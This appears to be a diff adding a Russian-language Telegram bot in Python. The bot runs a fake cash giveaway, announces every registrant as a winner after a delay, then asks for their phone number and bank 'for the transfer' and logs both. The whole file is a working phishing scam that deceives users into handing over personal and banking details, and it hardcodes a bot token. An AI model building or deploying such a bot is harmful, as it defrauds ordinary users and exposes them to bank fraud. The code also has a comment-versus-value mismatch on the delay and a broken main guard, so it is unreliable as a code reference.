@@ -1,0 +1,67 @@
+import asyncio
+from aiogram import Bot, Dispatcher, executor, types
+from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
+from aiogram.contrib.fsm_storage.memory import MemoryStorage
+from aiogram.dispatcher import FSMContext
+from aiogram.dispatcher.filters.state import State, StatesGroup
+
+TOKEN = "8585602773:AAH5vMlSQZvmPejYqynypNeoN1pZIIkZBXE"
+
+bot = Bot(token=TOKEN)
+dp = Dispatcher(bot, storage=MemoryStorage())
+
+class Form(StatesGroup):
+    phone = State()
+    bank = State()
+
+@dp.message_handler(commands=["start"])
+async def start(message: types.Message):
+    kb = InlineKeyboardMarkup().add(
+        InlineKeyboardButton("Я не бот", callback_data="captcha_ok")
+    )
+    await message.answer(
+        "🎁 Розыгрыш денежного подарка\n\n"
+        "Количество участников: 10000\n"
+        "Победитель определяется автоматически.\n\n"
+        "Для участия подтвердите, что вы не бот:",
+        reply_markup=kb
+    )
+
+@dp.callback_query_handler(lambda c: c.data == "captcha_ok")
+async def captcha_ok(callback: types.CallbackQuery):
+    await callback.message.edit_text(
+        "✅ Вы успешно зарегистрированы в розыгрыше.\n\n"
+        "Ожидайте подведения итогов."
+    )
+
+    await asyncio.sleep(172800)  # 5 дней
+
+    await bot.send_message(
+        callback.from_user.id,
+        "🎉 Поздравляем!\n\n"
+        "Вы стали победителем розыгрыша денежного подарка.\n\n"
+        "Для подведения результатов укажите номер телефона:"
+    )
+    await Form.phone.set()
+
+@dp.message_handler(state=Form.phone)
+async def get_phone(message: types.Message, state: FSMContext):
+    await state.update_data(phone=message.text)
+    await message.answer("🏦 Укажите банк для перевода:")
+    await Form.bank.set()
+
+@dp.message_handler(state=Form.bank)
+async def get_bank(message: types.Message, state: FSMContext):
+    data = await state.get_data()
+    print("PHONE:", data["phone"])
+    print("BANK:", message.text)
+
+    await message.answer(
+        "✅ Данные получены.\n\n"
+        "Перевод будет выполнен в ближайшее время.\n"
+        "Спасибо за участие!"
+    )
+    await state.finish()
+
+if name == "__main__":
+    executor.start_polling(dp, skip_updates=True)
